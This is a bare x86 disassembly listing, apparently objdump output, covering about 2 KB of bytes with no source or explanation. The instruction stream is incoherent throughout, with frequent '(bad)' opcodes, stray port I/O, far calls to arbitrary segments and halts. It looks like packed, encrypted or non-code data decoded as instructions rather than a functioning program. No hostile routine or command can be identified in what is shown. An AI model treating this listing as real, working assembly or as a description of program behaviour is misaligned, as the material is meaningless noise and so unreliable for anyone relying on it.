  418c82:	cmc    
  418c83:	or     DWORD PTR [ebx-0x56552f58],eax
  418c89:	lods   al,BYTE PTR ds:[esi]
  418c8a:	and    al,0x24
  418c8c:	test   eax,0x9618dd1
  418c91:	ins    BYTE PTR es:[edi],dx
  418c92:	push   edx
  418c93:	(bad)  
  418c94:	call   0xf88a:0xabe91fa9
  418c9b:	add    DWORD PTR [edi-0x59069d93],0x6
  418ca2:	jg     0x418cf9
  418ca4:	pop    ss
  418ca5:	jle    0x418cb0
  418ca7:	sbb    BYTE PTR [edi],bl
  418ca9:	pop    ebp
  418caa:	repz ficom WORD PTR [eax-0x14]
  418cae:	(bad)  
  418caf:	les    eax,FWORD PTR [ebx-0x2ecb5caa]
  418cb5:	or     BYTE PTR fs:[eax],bh
  418cb8:	call   0x4356:0x7b4efbfa
  418cbf:	or     edi,DWORD PTR [edi-0x5d]
  418cc2:	leave  
  418cc3:	cdq    
  418cc4:	adc    BYTE PTR ds:0x68fc7173,dh
  418cca:	sti    
  418ccb:	mov    edi,0xebedb701
  418cd0:	jge    0x418cd0
  418cd2:	pop    ecx
  418cd3:	sub    DWORD PTR [ecx-0x3bca66b0],ebp
  418cd9:	mov    eax,0x44e66566
  418cde:	repnz mov esp,0x9698767d
  418ce4:	scas   eax,DWORD PTR es:[edi]
  418ce5:	rol    BYTE PTR [edx-0xe],cl
  418ce8:	pop    ecx
  418ce9:	add    DWORD PTR ds:0xc37c9b4a,ecx
  418cef:	cdq    
  418cf0:	in     eax,0x45
  418cf2:	aad    0xaa
  418cf4:	sahf   
  418cf5:	cld    
  418cf6:	addr16 popa 
  418cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cf9:	pop    edi
  418cfa:	scas   eax,DWORD PTR es:[edi]
  418cfb:	retf   
  418cfc:	mov    eax,0x30195a0d
  418d01:	jg     0x418c8e
  418d03:	or     edi,ecx
  418d05:	add    dh,dh
  418d07:	jno    0x418d6f
  418d09:	inc    ecx
  418d0a:	and    al,0x8b
  418d0c:	add    BYTE PTR [edi+0x69],al
  418d0f:	xchg   edi,eax
  418d10:	nop
  418d11:	mov    ch,0xf8
  418d13:	ficomp DWORD PTR [ebx-0xa41496d]
  418d19:	mov    al,ds:0xc1006c5
  418d1e:	out    dx,eax
  418d1f:	aaa    
  418d20:	sbb    eax,0xa85b79b4
  418d25:	add    eax,0xdc2b8a65
  418d2a:	xor    bl,ch
  418d2c:	ds and al,0x4a
  418d2f:	mov    ebp,0xa539c288
  418d34:	fwait
  418d35:	(bad)  
  418d36:	out    0xfe,al
  418d38:	push   ebx
  418d39:	mov    ds:0xd9101205,al
  418d3e:	xchg   ecx,eax
  418d3f:	jle    0x418d6f
  418d41:	ins    DWORD PTR es:[edi],dx
  418d42:	and    DWORD PTR [ebp+esi*2-0x4b],ebp
  418d46:	mov    ebx,0xac6a070c
  418d4b:	mov    ecx,0x44eba008
  418d50:	sar    dh,cl
  418d52:	test   BYTE PTR ds:0xc667439e,ah
  418d58:	dec    eax
  418d59:	scas   eax,DWORD PTR es:[edi]
  418d5a:	mov    ds:0x935f285e,al
  418d5f:	cmp    al,0xf8
  418d61:	shl    BYTE PTR [ecx+eax*2-0x7f6d0a0b],1
  418d68:	data16 pushaw 
  418d6b:	adc    eax,0xec0d4bff
  418d70:	cmp    esi,DWORD PTR [edx-0x6ce61a59]
  418d76:	sbb    DWORD PTR [edi-0x307ec79c],0x1a
  418d7d:	icebp  
  418d7e:	jp     0x418d1b
  418d80:	sbb    ch,bh
  418d82:	je     0x418d1b
  418d84:	mov    ecx,0x27d18ea1
  418d89:	inc    ecx
  418d8a:	push   ebx
  418d8b:	adc    ebx,esi
  418d8d:	mov    ebx,0x62947152
  418d92:	fwait
  418d93:	stos   DWORD PTR es:[edi],eax
  418d94:	out    0x5d,al
  418d96:	test   al,0x1
  418d98:	push   0x7c
  418d9a:	jo     0x418dee
  418d9c:	cmp    DWORD PTR ds:[edx-0x6e],eax
  418da0:	adc    ebp,DWORD PTR ds:0x350b2904
  418da6:	lock sub al,0xb5
  418da9:	das    
  418daa:	cmp    al,0xa
  418dac:	jmp    0xa65d:0xa824b200
  418db3:	cmp    al,0xbb
  418db5:	shl    DWORD PTR [esi],1
  418db7:	outs   dx,DWORD PTR ds:[esi]
  418db8:	xor    al,BYTE PTR [edi]
  418dba:	int    0x2
  418dbc:	adc    eax,0x61092455
  418dc1:	mov    edi,0x3ea0e6a0
  418dc6:	jb     0x418d8e
  418dc8:	sub    BYTE PTR [edi+0x31],al
  418dcb:	dec    esp
  418dcc:	inc    esp
  418dcd:	hlt    
  418dce:	adc    al,ah
  418dd0:	push   ecx
  418dd1:	cmp    DWORD PTR [ebp+0x40],0xffffff97
  418dd5:	arpl   WORD PTR [eax+edi*2-0x1d],di
  418dd9:	cmp    eax,0x619efb0
  418dde:	jge    0x418de9
  418de0:	js     0x418e0f
  418de2:	mov    edx,0xbbd97db6
  418de7:	mov    BYTE PTR [edx+eiz*4],dl
  418dea:	mov    ah,0xe6
  418dec:	mov    ebx,0x7f8dbfc7
  418df1:	dec    ecx
  418df2:	xor    edx,edx
  418df4:	add    DWORD PTR [ebx],ecx
  418df6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  418df8:	pop    edi
  418df9:	fnstenv [ebp+0x47b0d6ae]
  418dff:	rol    ch,1
  418e01:	ss jge 0x418db4
  418e04:	sbb    DWORD PTR [edx+ebx*8+0x44],ebx
  418e08:	dec    edi
  418e09:	outs   dx,BYTE PTR ds:[esi]
  418e0a:	sub    BYTE PTR [esi],bl
  418e0c:	sbb    al,0x90
  418e0e:	xchg   ecx,eax
  418e0f:	dec    edi
  418e10:	jecxz  0x418e61
  418e12:	or     eax,0xf926533a
  418e17:	or     BYTE PTR [ebx],ah
  418e19:	dec    ebp
  418e1a:	pop    ds
  418e1b:	mov    ebx,0x55e2b549
  418e20:	inc    esp
  418e21:	pop    ebx
  418e23:	add    BYTE PTR [edi-0xc],bh
  418e26:	std    
  418e27:	and    al,0xaf
  418e29:	xor    ch,BYTE PTR ds:0x7712
  418e2e:	mov    al,ds:0xa046c608
  418e33:	mov    ds:0x9a7505fa,eax
  418e38:	repnz xchg edx,eax
  418e3a:	into   
  418e3b:	rcl    DWORD PTR [edx+0x1d],cl
  418e3e:	and    al,0x1f
  418e40:	jle    0x418e4e
  418e42:	pop    edi
  418e43:	shl    DWORD PTR [esi+0x6b],cl
  418e46:	push   ds
  418e47:	int3   
  418e48:	inc    ebp
  418e49:	pop    es
  418e4a:	jnp    0x418e87
  418e4c:	pop    ebx
  418e4d:	xor    esi,eax
  418e4f:	cmp    edx,DWORD PTR [edx+ebx*2-0x76a735ce]
  418e56:	(bad)  
  418e57:	inc    ecx
  418e58:	imul   esp,DWORD PTR [edi+edi*4],0xc64a8cff
  418e5f:	adc    eax,0x8f484509
  418e64:	cwde   
  418e65:	lahf   
  418e66:	dec    esi
  418e67:	in     eax,0xbf
  418e69:	in     al,dx
  418e6a:	sub    eax,0x5bfc4ed5
  418e6f:	sar    DWORD PTR [eax],0x50
  418e72:	or     edx,DWORD PTR [ecx]
  418e74:	mov    al,ds:0x4c3e1d1f
  418e79:	sub    esi,ebx
  418e7b:	in     eax,0x11
  418e7d:	push   0x2c
  418e7f:	dec    ecx
  418e80:	jnp    0x418efa
  418e82:	in     eax,0x99
  418e84:	sub    BYTE PTR [ebx],ah
  418e86:	loope  0x418edd
  418e88:	cmp    ecx,DWORD PTR [ecx+0x5590b342]
  418e8e:	leave  
  418e8f:	rol    DWORD PTR [ebx+0x2e370993],0x18
  418e96:	aas    
  418e97:	sub    al,0x5
  418e99:	dec    ecx
  418e9a:	stos   BYTE PTR es:[edi],al
  418e9b:	in     al,dx
  418e9c:	imul   eax,DWORD PTR [edx],0x42fabd67
  418ea2:	bound  edx,QWORD PTR [edx+0x2ae81367]
  418ea8:	push   ss
  418ea9:	mov    edx,0x362e72a4
  418eae:	dec    edi
  418eaf:	jb     0x418ea7
  418eb1:	xor    ebp,DWORD PTR [eax+ebx*4]
  418eb4:	mov    edi,0x69ce9713
  418eb9:	cmc    
  418eba:	ins    DWORD PTR es:[edi],dx
  418ebb:	cmp    al,0xac
  418ebd:	hlt    
  418ebe:	jmp    0xa0d6b9ed
  418ec3:	push   ebp
  418ec4:	dec    ebp
  418ec5:	xchg   edx,eax
  418ec6:	rcr    DWORD PTR [esp+esi*8-0x6a5acef8],0xa1
  418ece:	xor    bh,BYTE PTR [ebp+0xc]
  418ed1:	jp     0x418ef3
  418ed3:	sar    edx,0x17
  418ed6:	inc    ebp
  418ed7:	sahf   
  418ed8:	jb     0x418ec7
  418eda:	daa    
  418edb:	addr16 mov al,ds:0x2b28
  418edf:	pop    ebp
  418ee0:	gs clc 
  418ee2:	call   DWORD PTR ds:0x925956b3
  418ee8:	shl    BYTE PTR [ebx+0xaa69099],0x6f
  418eef:	cli    
  418ef0:	das    
  418ef1:	pusha  
  418ef2:	rcl    DWORD PTR ds:0xc7993bc4,0xc8
  418ef9:	loop   0x418f75
  418efb:	cmp    al,0x4
  418efd:	sbb    esi,DWORD PTR [ebp-0x5459e69e]
  418f03:	cdq    
  418f04:	jae    0x418ed2
  418f06:	retf   0xf0bf
  418f09:	mov    dh,0xe8
  418f0b:	mov    ecx,0x92945297
  418f10:	stos   DWORD PTR es:[edi],eax
  418f11:	push   eax
  418f12:	push   0x41
  418f14:	test   al,0x20
  418f16:	das    
  418f17:	ror    BYTE PTR [eax+0x6],1
  418f1a:	mov    esi,0x4af48f02
  418f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f20:	cmp    dl,bh
  418f22:	cmc    
  418f23:	stos   BYTE PTR es:[edi],al
  418f24:	jmp    0x418f94
  418f26:	sbb    BYTE PTR [ecx+0x7b],dh
  418f29:	jnp    0x418f66
  418f2b:	call   0x27f3:0x1e8c4efd
  418f32:	fadd   DWORD PTR [ecx]
  418f34:	icebp  
  418f35:	loop   0x418f2b
  418f37:	(bad)
  418f3a:	jnp    0x418ed2
  418f3c:	or     ebx,DWORD PTR [edx+ebp*2+0x50]
  418f40:	imul   BYTE PTR [eax+0xa8c94c0]
  418f46:	or     eax,0xfe9b6433
  418f4b:	lods   eax,DWORD PTR ds:[esi]
  418f4c:	add    eax,0xb21096aa
  418f51:	popa   
  418f52:	xchg   ecx,eax
  418f53:	mov    edx,edi
  418f55:	jg     0x418f84
  418f57:	add    DWORD PTR [ecx],ebp
  418f59:	pop    ebp
  418f5a:	das    
  418f5b:	pop    ebp
  418f5c:	out    dx,al
  418f5d:	add    ebp,DWORD PTR [ecx+0x51b6b864]
  418f63:	adc    DWORD PTR [ecx+edi*2+0x49],esi
  418f67:	mov    DWORD PTR [edx],ecx
  418f69:	(bad)  
  418f6a:	jmp    0x418f77
  418f6c:	(bad)  
  418f6d:	imul   ebp,DWORD PTR [eax-0x10862612],0x7
  418f74:	ins    BYTE PTR es:[edi],dx
  418f75:	test   DWORD PTR [edi-0x138adcd7],esp
  418f7b:	dec    ebx
  418f7c:	retf   
  418f7d:	xlat   BYTE PTR ds:[ebx]
  418f7e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  418f80:	test   DWORD PTR [edx-0x1],ebx
  418f83:	xchg   ebx,eax
  418f84:	xchg   ecx,eax
  418f85:	fdiv   DWORD PTR [edx-0x65]
  418f88:	lods   eax,DWORD PTR ds:[esi]
  418f89:	cmc    
  418f8a:	sbb    dl,BYTE PTR [ecx-0x554560a]
  418f90:	dec    esi
  418f91:	or     eax,0xeba8262d
  418f96:	push   esp
  418f97:	inc    edx
  418f98:	mov    edi,0xc26d814e
  418f9d:	repz shr eax,0x99
  418fa1:	cmp    DWORD PTR [eax+0x4b80b831],ebp
  418fa7:	outs   dx,BYTE PTR ds:[esi]
  418fa8:	mov    dl,0xb3
  418faa:	and    al,0xbe
  418fac:	sbb    eax,ecx
  418fae:	iret   
  418faf:	fidivr DWORD PTR [ebp-0x63e3991c]
  418fb5:	loope  0x41902e
  418fb7:	cmovle ecx,DWORD PTR [ebx]
  418fba:	and    al,0x93
  418fbc:	push   ds
  418fbd:	mov    esp,0xf045e642
  418fc2:	pop    edi
  418fc3:	mov    esi,DWORD PTR [ecx]
  418fc5:	push   esi
  418fc6:	aad    0x8d
  418fc8:	push   0x51356a51
  418fcd:	lods   al,BYTE PTR ds:[esi]
  418fce:	cmp    BYTE PTR [ecx],cl
  418fd0:	nop
  418fd1:	das    
  418fd2:	push   ecx
  418fd3:	xor    eax,0x60df4c8c
  418fd8:	or     BYTE PTR [eax+ecx*4+0x6d],0x8e
  418fdd:	mov    esi,0xefc60cc4
  418fe2:	cwde   
  418fe3:	jp     0x419058
  418fe5:	and    esp,DWORD PTR [ebp-0x3898bc88]
  418feb:	jecxz  0x418fda
  418fed:	push   esp
  418fee:	adc    eax,0x4a3db479
  418ff3:	outs   dx,BYTE PTR ds:[esi]
  418ff4:	mov    WORD PTR [eax],ss
  418ff6:	pop    edx
  418ff7:	mov    al,0x3f
  418ff9:	mov    ch,0x9d
  418ffb:	inc    ebp
  418ffc:	mov    bh,0xf6
  418ffe:	xlat   BYTE PTR ds:[ebx]
  418fff:	js     0x418ff5
  419001:	dec    eax
  419002:	pop    esi
  419003:	push   ebx
  419004:	or     eax,edi
  419006:	mov    esi,0x9438c42d
  41900b:	and    bh,BYTE PTR [edi-0x3243e57]
  419011:	call   0xb4b26b2
  419016:	mov    al,0x65
  419018:	jo     0x419029
  41901a:	xor    al,BYTE PTR [ebx+0x3b]
  41901d:	adc    cl,BYTE PTR [eax+0x6a]
  419020:	es pop edi
  419022:	mov    WORD PTR [ebp-0x79],cs
  419025:	mov    al,0x19
  419027:	out    0x16,al
  419029:	fcmovbe st,st(1)
  41902b:	jp     0x418fe2
  41902d:	jecxz  0x41909c
  41902f:	dec    esp
  419030:	push   edi
  419031:	icebp  
  419032:	ins    DWORD PTR es:[edi],dx
  419033:	sub    eax,0x7058db71
  419038:	xor    DWORD PTR [eax],ebx
  41903a:	pop    ss
  41903b:	in     eax,dx
  41903c:	pusha  
  41903d:	fidivr WORD PTR [ebx+0x11]
  419040:	inc    esp
  419041:	and    dh,BYTE PTR [eax+edx*8-0x65]
  419045:	call   0x27a:0xfc1319e0
  41904c:	push   ecx
  41904d:	fcomp  QWORD PTR [esi+0x7eaa3b2e]
  419053:	pop    ebp
  419054:	inc    eax
  419055:	and    eax,0xca831a3a
  41905a:	cwde   
  41905b:	mov    dl,0x3f
  41905e:	xchg   edi,eax
  41905f:	imul   ebp,DWORD PTR [ebx+0x65bf129e],0xffffffeb
  419066:	pushf  
  419067:	int3   
  419068:	and    eax,0xb0de7f4d
  41906d:	xchg   ch,bh
  41906f:	adc    BYTE PTR gs:[edi-0x793cc948],al
  419076:	sbb    al,0x33
  419078:	sub    BYTE PTR [ebp+0x6d],ah
  41907b:	or     al,0x62
  41907d:	test   BYTE PTR [ecx],al
  41907f:	dec    eax
  419080:	aaa    
  419081:	jno    0x62b0b766
  419087:	cmp    eax,0xf4696de
  41908c:	xchg   esi,eax
  41908d:	jb     0x4190a0
  41908f:	sti    
  419090:	cmp    bl,BYTE PTR [ebx]
  419092:	popa   
  419093:	lods   eax,DWORD PTR ds:[esi]
  419094:	xchg   ecx,eax
  419095:	inc    esp
  419096:	gs push ecx
  419098:	cmp    ebx,ebp
  41909a:	cwde   
  41909b:	jle    0x419052
  41909d:	push   esp
  41909e:	test   DWORD PTR [edx-0x76],edx
  4190a1:	add    BYTE PTR [ecx],ch
  4190a3:	in     al,0xbe
  4190a5:	cmp    ch,BYTE PTR [ecx+0x13aea024]
  4190ab:	aas    
  4190ac:	sub    BYTE PTR [eax-0x6a],ah
  4190af:	jp     0x4190f8
  4190b1:	jo     0x4190f3
  4190b3:	mov    edi,DWORD PTR [eax+0x44783afe]
  4190b9:	sbb    al,0x6e
  4190bb:	(bad)  
  4190bc:	aas    
  4190bd:	jge    0x419135
  4190bf:	inc    ecx
  4190c0:	inc    esi
  4190c1:	mov    ds:0x63faa0b0,al
  4190c6:	lods   eax,DWORD PTR ds:[esi]
  4190c7:	das    
  4190c8:	adc    ebx,0xf19338fa
  4190ce:	loop   0x41909d
  4190d0:	adc    DWORD PTR [edi+0xb],ebp
  4190d3:	test   eax,0xc151c9d3
  4190d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d9:	adc    al,BYTE PTR [ebx-0x4fb99b44]
  4190df:	dec    edx
  4190e0:	das    
  4190e1:	mov    ds:0x4a845dd0,al
  4190e6:	mov    cl,0x8f
  4190e8:	adc    eax,0xaec74c93
  4190ed:	sub    al,0x33
  4190ef:	inc    ebp
  4190f0:	(bad)  
  4190f1:	rcl    dl,1
  4190f3:	out    dx,al
  4190f4:	mov    dh,0x13
  4190f6:	xchg   esp,eax
  4190f7:	mov    bh,0x1b
  4190f9:	inc    ebx
  4190fa:	out    dx,al
  4190fb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4190fd:	inc    esi
  4190fe:	ret    0x51
  419101:	xchg   esi,eax
  419102:	mov    ebx,0xcd227960
  419107:	popa   
  419108:	jns    0x419121
  41910a:	add    DWORD PTR [ebp-0xa83f7cf],ebp
  419110:	ja     0x4190b0
  419112:	in     al,0x9e
  419114:	push   0xc5ddace4
  419119:	add    cl,BYTE PTR [ebp-0x2f]
  41911c:	jno    0x419129
  41911e:	hlt    
  41911f:	test   al,al
  419121:	call   0x76f9566e
  419126:	nop
  419127:	xor    DWORD PTR [edi-0x3d],ecx
  41912a:	mov    eax,0x6664f40d
  41912f:	push   es
  419130:	ret    0xe689
  419133:	outs   dx,BYTE PTR ds:[esi]
  419134:	loope  0x419187
  419136:	call   0xaf2e:0x37485cc6
  41913d:	add    DWORD PTR [edi],edi
  41913f:	jg     0x419106
  419141:	xchg   esp,eax
  419142:	mov    DWORD PTR [edi+ebp*4-0x4b980521],edi
  419149:	xchg   edx,eax
  41914a:	jbe    0x4191ca
  41914c:	jae    0x4191a4
  41914e:	sub    al,0x6e
  419150:	jmp    0xff1b8c69
  419155:	mov    bl,0x2a
  419157:	gs int 0x55
  41915a:	or     dl,al
  41915c:	lock adc bl,cl
  41915f:	loop   0x4191c6
  419161:	cmp    al,0xd3
  419163:	mov    eax,esi
  419165:	xchg   DWORD PTR [ebx-0x1b581b8e],esp
  41916b:	adc    al,0x61
  41916d:	fisub  WORD PTR [esi-0x5c]
  419170:	push   esp
  419171:	xchg   ebx,eax
  419172:	das    
  419173:	inc    esi
  419174:	push   eax
  419175:	mov    ch,cl
  419177:	xor    eax,0x1df649f9
  41917c:	sbb    BYTE PTR [eax-0x5d8ee42e],ah
  419182:	or     DWORD PTR [ebx+0x7],eax
  419185:	fcmovu st,st(2)
  419187:	aas    
  419188:	mov    ch,0xe8
  41918a:	pop    ds
  41918b:	mul    BYTE PTR [esi]
  41918d:	push   ebx
  41918e:	xor    bl,BYTE PTR [edx-0x34497e78]
  419194:	mov    edi,0x6f45c633
  419199:	cwde   
  41919a:	mov    cl,BYTE PTR [ebx]
  41919c:	mov    bl,BYTE PTR [ebp-0x5fb2fb25]
  4191a2:	jo     0x419189
  4191a4:	sar    BYTE PTR gs:[esi],1
  4191a7:	add    eax,0xc511612d
  4191ac:	fist   WORD PTR [edi-0x71]
  4191af:	adc    edx,DWORD PTR [esi]
  4191b1:	cmp    dh,BYTE PTR [bx+di-0x2834]
  4191b6:	jmp    0x93e0aa43
  4191bb:	cmp    ah,ah
  4191bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191be:	cwde   
  4191bf:	or     esi,DWORD PTR [edx]
  4191c1:	and    DWORD PTR [eax-0x7853321e],0x8
  4191c8:	and    edx,esi
  4191ca:	xor    bl,BYTE PTR [edi-0x70]
  4191cd:	cmp    eax,DWORD PTR [ebx+0x52d52a27]
  4191d3:	jecxz  0x41917d
  4191d5:	loopne 0x4191f8
  4191d7:	fdivr  QWORD PTR [esi+0x23]
  4191da:	ss call 0xc900:0x1761dfb1
  4191e2:	ret    
  4191e3:	not    eax
  4191e5:	cmp    al,0x8f
  4191e7:	xor    eax,0xdb6810df
  4191ec:	mov    cl,0xf
  4191ee:	addr16 inc ecx
  4191f0:	inc    esp
  4191f1:	jge    0x419176
  4191f3:	(bad)  
  4191f5:	sbb    esp,esp
  4191f7:	xor    bl,BYTE PTR [edi-0x3cc9dea2]
  4191fd:	repnz inc ebp
  4191ff:	test   BYTE PTR [esi-0x112c499f],bl
  419205:	call   0x6e0d:0x78c3ea4e
  41920c:	jp     0x41924f
  41920e:	cdq    
  41920f:	push   ebx
  419210:	pop    ebx
  419211:	adc    bh,BYTE PTR [edx-0x1cd29841]
  419217:	push   0x1740bc1d
  41921c:	stc    
  41921d:	mov    edi,0xb5f687e1
  419222:	sub    si,WORD PTR cs:[ecx-0x52]
  419227:	mov    ds:0x64d477f3,eax
  41922c:	sub    eax,0x647239e7
  419231:	push   eax
  419232:	and    DWORD PTR [edi-0x3e],esp
  419235:	fmul   DWORD PTR [eax]
  419237:	pop    ebp
  419238:	loop   0x41926e
  41923a:	mov    esi,0x86b5bb50
  41923f:	sbb    DWORD PTR [edx-0x30],esi
  419242:	mov    ds:0xaf798ad3,eax
  419247:	jge    0x4192a3
  419249:	fsubr  QWORD PTR [edi+0x1]
  41924c:	std    
  41924d:	xchg   DWORD PTR [edx-0x7ee726e],ebx
  419253:	jp     0x419247
  419255:	mov    eax,ds:0x410905b2
  41925a:	push   ds
  41925b:	loopne 0x4192d0
  41925d:	jns    0x41924b
  41925f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419260:	outs   dx,BYTE PTR ds:[esi]
  419261:	push   es
  419262:	push   esp
  419263:	mov    cl,ah
  419265:	pop    edx
  419266:	adc    BYTE PTR [edx-0x16],ah
  419269:	mov    ds:0xfb3ecba9,eax
  41926e:	fld    QWORD PTR [edx-0x6e750e79]
  419274:	xchg   BYTE PTR [ebp+0x3858d29],ah
  41927a:	jb     0x4192e1
  41927c:	add    al,0x6a
  41927e:	xor    BYTE PTR [edi+eax*1-0x23],bl
  419282:	out    dx,al
  419283:	push   edi
  419284:	sbb    ebx,DWORD PTR [edi+0x29a65d53]
  41928a:	fsub   QWORD PTR [ecx]
  41928c:	ins    DWORD PTR es:[edi],dx
  41928d:	dec    esp
  41928e:	pop    edi
  41928f:	test   BYTE PTR [eax],0x3f
  419292:	and    DWORD PTR [ebp+0x27],0xffffffc7
  419296:	iret   
  419297:	adc    DWORD PTR [edx+0x5b],edx
  41929a:	jle    0x41921e
  41929c:	push   0xf4c53fe2
  4192a1:	imul   ecx,edx,0xffffffb3
  4192a4:	push   ss
  4192a5:	mov    eax,0xe20ee7c8
  4192aa:	pop    ebp
  4192ab:	mov    eax,0x4467e0eb
  4192b0:	xchg   ebp,eax
  4192b1:	or     DWORD PTR [esi+0x2588c79a],0xffffff8b
  4192b8:	(bad)  
  4192b9:	out    0x7e,eax
  4192bb:	ret    0xd76e
  4192be:	into   
  4192bf:	imul   bl
  4192c1:	(bad)  
  4192c2:	xchg   ebx,eax
  4192c3:	(bad)  
  4192c4:	int    0xe4
  4192c6:	aas    
  4192c7:	push   ss
  4192c8:	in     al,0x83
  4192ca:	dec    esi
  4192cb:	mov    ds,WORD PTR [ecx]
  4192cd:	lock fmul DWORD PTR [esi]
  4192d0:	aas    
  4192d1:	test   al,0xcc
  4192d3:	adc    al,0x3e
  4192d5:	aam    0x9c
  4192d7:	dec    esp
  4192d8:	cmc    
  4192d9:	xor    BYTE PTR [edx+ecx*2-0x61],dl
  4192dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192de:	xchg   edx,eax
  4192df:	fcomp  QWORD PTR [edx-0x6]
  4192e2:	adc    DWORD PTR [eax],edi
  4192e4:	call   0x8b85:0xd5bd6fcf
  4192eb:	xchg   esi,eax
  4192ec:	stc    
  4192ed:	fistp  QWORD PTR [edx+eiz*4+0x71]
  4192f1:	xor    cl,BYTE PTR [ebx+0x1b69b27d]
  4192f7:	sahf   
  4192f8:	out    dx,al
  4192f9:	dec    ecx
  4192fa:	sub    DWORD PTR [edi-0x40],edi
  4192fd:	shl    DWORD PTR [ebx-0x46],0xa3
  419301:	ds aaa 
  419303:	adc    BYTE PTR [ecx-0x4c93083f],dh
  419309:	imul   ecx,DWORD PTR [edi+0x7],0x5e
  41930d:	in     al,dx
  41930e:	out    0x6f,eax
  419310:	or     dl,dh
  419312:	xor    edi,0x6e
  419315:	int3   
  419316:	test   DWORD PTR [edi+0x3083f4d1],eax
  41931c:	aas    
  41931d:	loopne 0x4192bd
  41931f:	mov    dl,0x38
  419321:	shr    DWORD PTR [eax+0x21],0xf2
  419325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419326:	sub    edi,DWORD PTR [edi-0x35]
  419329:	jnp    0x41930d
  41932b:	inc    ecx
  41932c:	imul   edx,edi,0x67
  41932f:	ret    0xbda3
  419332:	stc    
  419333:	pop    edx
  419334:	pop    edx
  419335:	(bad)  
  419336:	(bad)  
  419337:	jne    0x4193a8
  419339:	stos   BYTE PTR es:[edi],al
  41933a:	push   edi
  41933b:	(bad)  
  41933c:	mov    edi,0x8ac77a9f
  419341:	daa    
  419342:	mov    ch,0x1d
  419344:	xchg   esp,eax
  419345:	mov    ecx,0xaae108ac
  41934a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41934b:	retf   
  41934c:	push   eax
  41934d:	(bad)  
  41934e:	icebp  
  41934f:	mov    ebp,0x4fd4bafe
  419354:	inc    esp
  419355:	rcl    bl,1
  419357:	mov    dl,0x39
  419359:	mov    edx,0x54c6ee23
  41935e:	or     eax,0x7e61cb88
  419363:	hlt    
  419364:	rcr    ebx,1
  419366:	mov    ah,0x68
  419368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419369:	cli    
  41936a:	push   edi
  41936b:	dec    ebx
  41936c:	ficom  WORD PTR [ecx+0x2f]
  41936f:	mov    al,ds:0xbacd4a17
  419374:	mov    BYTE PTR ss:[ecx+0x4d],bh
  419378:	inc    ecx
  419379:	push   0x5cd539a4
  41937e:	pushf  
  41937f:	jae    0x419353
  419381:	pop    eax
  419382:	mov    cl,0x15
  419384:	sub    edi,eax
  419386:	sub    al,0xfd
  419388:	mov    dl,0x48
  41938a:	mov    esp,DWORD PTR [esi+ecx*1-0x2]
  41938e:	pop    es
  41938f:	xchg   ecx,eax
  419390:	push   ecx
  419391:	or     al,0xe8
  419393:	neg    DWORD PTR [edi-0x6c]
  419396:	fisttp DWORD PTR ds:0x9ce81680
  41939c:	fisttp DWORD PTR [edi-0x5b97e193]
  4193a2:	dec    edx
  4193a3:	sub    eax,DWORD PTR [ecx]
  4193a5:	jns    0x41933f
  4193a7:	sbb    ah,dh
  4193a9:	add    DWORD PTR [ebx+eax*8],edx
  4193ac:	test   eax,0x6c6dc2a4
  4193b1:	stos   BYTE PTR es:[edi],al
  4193b2:	pop    ebx
  4193b3:	or     dh,ch
  4193b5:	loop   0x419406
  4193b7:	mov    bl,bl
  4193b9:	or     BYTE PTR [ecx],dh
  4193bb:	and    ah,BYTE PTR [ebx+0xeeb068c]
  4193c1:	sub    al,0xb1
  4193c3:	pusha  
  4193c4:	push   ebx
  4193c5:	add    DWORD PTR [ebx-0x6b],ebx
  4193c8:	mov    eax,ds:0x72709880
  4193cd:	adc    DWORD PTR [ecx-0x13],eax
  4193d0:	mov    BYTE PTR [ebp+0x41c1f3d7],0x7d
  4193d7:	fs cld 
  4193d9:	stos   BYTE PTR es:[edi],al
  4193da:	lods   eax,DWORD PTR ds:[esi]
  4193db:	ss ss jecxz 0x4193e2
  4193df:	ror    DWORD PTR [ecx],1
  4193e1:	sbb    al,BYTE PTR [eax-0x39]
  4193e4:	retf   0x5997
  4193e7:	mov    eax,0xa584d53a
  4193ec:	repnz cmp DWORD PTR [ebp+0x56],0xffffffcd
  4193f1:	retf   0x1414
  4193f4:	ret    0x8724
  4193f7:	jo     0x4193fa
  4193f9:	xchg   ah,bl
  4193fb:	pop    ebp
  4193fc:	cmp    BYTE PTR [eax+0x5c],bl
  4193ff:	mov    bh,0x6c
  419401:	mov    ds:0xd349416d,eax
  419406:	loop   0x4193e6
  419408:	retf   
  419409:	xchg   ebx,eax
  41940a:	or     ch,BYTE PTR [ebx+0x3c]
  41940d:	lods   al,BYTE PTR ds:[esi]
  41940e:	ss test eax,0xdca32395
  419414:	mov    eax,0x3d6bbcba
  419419:	push   ebp
  41941a:	out    dx,eax
  41941b:	mov    eax,DWORD PTR [esi-0x28a42d09]
  419421:	cmp    edx,DWORD PTR [esi]
  419423:	jne    0x4193a9
  419425:	ret    0x9883
  419428:	and    DWORD PTR [edi-0x18],eax
  41942b:	call   0x1d11dabe
  419430:	or     eax,0x55249c7e
  419435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419436:	loop   0x4193b9
  419438:	outs   dx,DWORD PTR ds:[esi]
  419439:	jbe    0x4193f9
  41943b:	aad    0xa2
  41943d:	jp     0x4194b0
  41943f:	jae    0x419488
  419441:	icebp  
  419442:	mov    es,edi
  419444:	mov    BYTE PTR [edi+edi*1-0x49818e8d],al
  41944b:	sub    al,0x96
  41944d:	frstpm(287 only) 
  41944f:	das    
  419450:	fcomp  QWORD PTR ds:0x7a0f7c06
  419456:	cmp    al,0xa
  419458:	xor    esi,edx
  41945a:	jns    0x419464
  41945c:	test   al,0x4a
  41945e:	push   ecx
  41945f:	(bad)
  419462:	scas   eax,DWORD PTR es:[edi]
  419463:	test   eax,0x7250dd40
  419468:	jns    0x4194e4
  41946a:	mov    dh,0xad
  41946c:	ss dec ebp
